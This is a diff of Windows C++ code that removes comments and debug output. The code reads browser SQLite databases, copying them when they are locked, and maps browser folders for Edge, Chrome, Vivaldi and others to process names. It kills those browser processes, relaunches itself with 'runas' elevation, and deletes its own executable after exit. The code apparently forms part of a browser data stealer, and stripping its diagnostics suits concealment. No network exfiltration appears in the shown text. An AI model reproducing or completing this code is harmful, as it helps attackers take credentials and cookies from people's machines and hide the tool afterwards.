@@ -17,7 +17,7 @@ BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinat
 		return false;
 	}
 
-	//std::cout << "File copied successfully." << std::endl;
+
 	return true;
 }
 
@@ -26,7 +26,7 @@ sqlite3_stmt* query_database(std::string target_data, const char* database_query
 	sqlite3* db;
 	if (sqlite3_open(target_data.c_str(), &db) == SQLITE_OK)
 	{
-		//std::cout << "file found" << std::endl;
+
 		sqlite3_stmt* stmt = nullptr;
 		if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
 		{
@@ -34,7 +34,7 @@ sqlite3_stmt* query_database(std::string target_data, const char* database_query
 		}
 		else
 		{
-			//std::cerr << "Database file in use .... " << std::endl;
+
 			std::string new_target = target_data + " copy";
 			custom_copy_file(target_data, new_target);
 
@@ -45,7 +45,7 @@ sqlite3_stmt* query_database(std::string target_data, const char* database_query
 			}
 			else
 			{
-				//std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
+
 				return stmt;
 			}
 		}
@@ -60,44 +60,44 @@ BOOL kill_process(std::string process_path)
 	if (process_name == "")
 		return false;
 
-	// Convert std::string to LPCWSTR (wide string)
+
 	std::wstring wProcessName(process_name.begin(), process_name.end());
 
-	// Get a snapshot of all processes in the system
+
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hSnapshot == INVALID_HANDLE_VALUE) {
-		//std::cerr << "Failed to create snapshot." << std::endl;
+
 		return false;
 	}
 
 	PROCESSENTRY32 processEntry;
 	processEntry.dwSize = sizeof(PROCESSENTRY32);
 
-	// Retrieve information about the first process
+
 	if (!Process32First(hSnapshot, &processEntry)) {
-		//std::cerr << "Failed to retrieve process information." << std::endl;
+
 		CloseHandle(hSnapshot);
 		return false;
 	}
 
-	// Iterate through all processes in the snapshot
+
 	do {
 		if (!_wcsicmp(processEntry.szExeFile, wProcessName.c_str())) {
-			// Open the process with terminate rights
+
 			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
 			if (hProcess != NULL) {
-				// Terminate the process
+
 				if (TerminateProcess(hProcess, 0)) {
 					continue;
 				}
 				else {
-					//std::cerr << "Failed to terminate process: " << process_name << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
+
 					continue;
 				}
 				CloseHandle(hProcess);
 			}
 			else {
-				//std::cerr << "Failed to open process: " << process_name << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
+
 				continue;
 			}
 		}
@@ -137,17 +137,14 @@ void RestartAsAdmin(const char* param) {
 	std::wstring wParam = ConvertToWideString(param);
 
 	SHELLEXECUTEINFO sei = { sizeof(sei) };
-	sei.lpVerb = L"runas";  // Request elevation
-	sei.lpFile = szPath;   // Path to executable
-	sei.lpParameters = wParam.c_str();  // Pass the parameter
+	sei.lpVerb = L"runas";
+	sei.lpFile = szPath;
+	sei.lpParameters = wParam.c_str();
 	sei.nShow = SW_SHOWNORMAL;
 
-	/*if (!ShellExecuteEx(&sei)) {
-		MessageBoxA(NULL, "Failed to elevate!", "Error", MB_OK | MB_ICONERROR);
-	}*/
 
 	if (ShellExecuteEx(&sei)) {
-		// Exit the current instance to avoid duplicate execution
+
 		exit(0);
 	}
 	else {
@@ -257,7 +254,7 @@ std::string BytesToHexString(const BYTE* byteArray, size_t size) {
 }
 
 std::string GetBrowserProcessName(const std::string& browserFolder) {
-	// Map to associate browser folder paths with their process names
+
 	static std::map<std::string, std::string> browserProcessMap = {
 		{"Microsoft\\Edge\\", "msedge.exe"},
 		{"Google\\Chrome\\", "chrome.exe"},
@@ -289,7 +286,7 @@ std::string GetBrowserProcessName(const std::string& browserFolder) {
 		{"Vivaldi\\", "vivaldi.exe"}
 	};
 
-	// Find the process name in the map
+
 	auto it = browserProcessMap.find(browserFolder);
 	if (it != browserProcessMap.end()) {
 		return it->second;
@@ -302,7 +299,7 @@ std::string GetBrowserProcessName(const std::string& browserFolder) {
 std::string ReadUTF16LEFileToUTF8(const std::string& filename) {
 	std::ifstream file(filename, std::ios::binary);
 	if (!file) {
-		//throw std::runtime_error("Failed to open file!");
+
 		return "";
 	}
 
@@ -310,22 +307,22 @@ std::string ReadUTF16LEFileToUTF8(const std::string& filename) {
 	file.close();
 
 	if (buffer.size() < 2) {
-		//throw std::runtime_error("File too small!");
+
 		return "";
 	}
 
-	// If there's no BOM, you can skip the BOM check and start at the beginning of the file
+
 	size_t offset = 0;
 
-	// Check for BOM (FF FE) and adjust the offset
+
 	if (buffer[0] == '\xFF' && buffer[1] == '\xFE') {
-		offset = 2; // Skip BOM
+		offset = 2;
 	}
 
-	// Convert raw UTF-16 bytes (after BOM if present) to wide string
+
 	std::wstring wide_str(reinterpret_cast<const wchar_t*>(&buffer[offset]), (buffer.size() - offset) / 2);
 
-	// Convert wide string (UTF-16) to UTF-8
+
 	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wide_str.c_str(), -1, nullptr, 0, nullptr, nullptr);
 	std::string utf8_str(size_needed, 0);
 	WideCharToMultiByte(CP_UTF8, 0, wide_str.c_str(), -1, &utf8_str[0], size_needed, nullptr, nullptr);
@@ -345,7 +342,7 @@ std::string GetAppDataPath()
 
 void DeleteFileAfterExit(const std::string& exePath) {
 	std::string cmd = "cmd /C ping 127.0.0.1 -n 2 > nul & del \"" + exePath + "\"";
-	system(cmd.c_str());  // Waits a moment before deleting
+	system(cmd.c_str());
 }
 
 bool waitForFile(const std::string& filePath, int maxWaitTimeMs, int pollIntervalMs) {
@@ -357,57 +354,19 @@ bool waitForFile(const std::string& filePath, int maxWaitTimeMs, int pollInterva
 		).count();
 
 		if (elapsedMs > maxWaitTimeMs) {
-			return false; // Timeout
+			return false;
 		}
 
 		HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hFile != INVALID_HANDLE_VALUE) {
 			CloseHandle(hFile);
-			return true; // File is available
+			return true;
 		}
 
 		if (GetLastError() != ERROR_SHARING_VIOLATION) {
-			return false; // Some other error occurred
+			return false;
 		}
 
 		std::this_thread::sleep_for(std::chrono::milliseconds(pollIntervalMs));
 	}
 }
-
-//bool writeToFileWithLock(const std::string& data, const std::string& path, int timeout_ms) {
-//	HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-//	if (hFile == INVALID_HANDLE_VALUE) {
-//		std::cerr << "Failed to open file." << std::endl;
-//		return false;
-//	}
-//
-//	auto start = std::chrono::steady_clock::now();
-//	while (true) {
-//		OVERLAPPED overlapped = {};
-//		if (LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, MAXDWORD, MAXDWORD, &overlapped)) {
-//			break;
-//		}
-//		if (GetLastError() != ERROR_LOCK_VIOLATION) {
-//			CloseHandle(hFile);
-//			return false;
-//		}
-//		if (std::chrono::steady_clock::now() - start > std::chrono::milliseconds(timeout_ms)) {
-//			CloseHandle(hFile);
-//			std::cerr << "Timeout waiting for file lock." << std::endl;
-//			return false;
-//		}
-//		std::this_thread::sleep_for(std::chrono::milliseconds(50));
-//	}
-//
-//	std::ofstream outFile(path, std::ios::out | std::ios::trunc);
-//	if (!outFile) {
-//		std::cerr << "Failed to write to file." << std::endl;
-//		CloseHandle(hFile);
-//		return false;
-//	}
-//	outFile << data;
-//	outFile.close();
-//	UnlockFileEx(hFile, 0, MAXDWORD, MAXDWORD, NULL);
-//	CloseHandle(hFile);
-//	return true;
-//}
